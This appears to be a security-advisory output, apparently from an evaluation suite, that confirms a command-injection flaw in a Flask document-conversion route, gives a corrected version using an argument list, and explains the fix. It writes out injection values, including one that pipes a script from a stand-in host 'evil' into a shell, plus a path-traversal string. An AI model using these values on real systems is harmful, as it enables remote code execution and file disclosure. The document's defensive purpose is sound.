## Verdict

Confirmed. `filename` comes from `request.form["filename"]`, an attacker-controlled POST field, and flows unsanitized into a shell command string executed with `subprocess.run(command, shell=True, check=True)`. A value such as `report.docx; curl http://evil/x | sh` (or using backticks/`$()`) is interpolated directly into the shell-parsed string and executed as additional commands.

## Source

`E:/Github/cwe-advisor/evals/cases/78/python/ConvertFileSubprocessShell/ConvertFileSubprocessShell.py`, line 14: `filename = request.form["filename"]`. This value is concatenated into `input_path` and `output_path` and then into the `command` string (lines 15-21), which reaches the shell at line 23 via `subprocess.run(command, shell=True, check=True)`.

## Fix

### File: ConvertFileSubprocessShell.py
```python
import os
import subprocess

from flask import Flask, abort, request, send_file

app = Flask(__name__)

UPLOAD_DIR = "/var/data/uploads"
OUTPUT_DIR = "/var/data/converted"


@app.route("/convert", methods=["POST"])
def convert_document():
    """Convert an uploaded document to PDF using the installed LibreOffice CLI."""
    filename = request.form["filename"]

    # Reject anything that isn't a plain filename: no path separators,
    # no traversal segments, and no shell metacharacters can reach the
    # command line since we never build a shell string at all.
    safe_name = os.path.basename(filename)
    if safe_name != filename or safe_name in ("", ".", ".."):
        abort(400, description="Invalid filename")

    input_path = os.path.join(UPLOAD_DIR, safe_name)
    output_path = os.path.join(OUTPUT_DIR, f"{safe_name}.pdf")

    # Confirm the resolved path stays inside UPLOAD_DIR (defense in depth
    # against symlinks or unexpected separators the basename check missed).
    if os.path.dirname(os.path.abspath(input_path)) != os.path.abspath(UPLOAD_DIR):
        abort(400, description="Invalid filename")

    subprocess.run(
        [
            "libreoffice",
            "--headless",
            "--convert-to",
            "pdf",
            "--outdir",
            OUTPUT_DIR,
            "--",
            input_path,
        ],
        shell=False,
        check=True,
    )

    return send_file(output_path)


if __name__ == "__main__":
    app.run()
```

## Explanation

The original code built a single string with the user-supplied `filename` spliced in and handed it to `subprocess.run(..., shell=True)`. With `shell=True`, `subprocess` passes the string to `/bin/sh -c`, so any shell metacharacter in `filename` (`;`, `|`, `` ` ``, `$()`, `&&`, etc.) is interpreted by the shell rather than treated as literal filename text, giving the caller arbitrary command execution with the web process's privileges.

The fix removes the shell entirely: `subprocess.run` is called with an argument list and `shell=False` (the default, made explicit here), so each element is passed to `execve` verbatim and no shell ever parses the string — metacharacters in the filename have no special meaning to the target program. A leading `--` is added before the user-controlled path so LibreOffice cannot misinterpret a filename starting with `-` as an option flag.

Because the filename also determines a filesystem path, `os.path.basename()` strips any directory components, and the code rejects the value outright if the basename does not equal the original input (which would indicate an absolute path, embedded separators, or `..` traversal) or if it is empty, `.`, or `..`. A final check confirms the resolved input path's parent directory still equals `UPLOAD_DIR`, guarding against traversal via unexpected separator handling. This does not impose an artificial content allowlist on the filename — it only prevents the value from ever leaving its intended directory or being seen by a shell, so a legitimate upload name with spaces, unicode characters, or punctuation still converts normally.

To verify: a normal filename (e.g. `report.docx`) still converts to `report.docx.pdf` exactly as before. A crafted value such as `report.docx; touch /tmp/pwned` or `../../etc/passwd` is now rejected with a 400 response before any subprocess is spawned, and no shell process is ever created to interpret it.
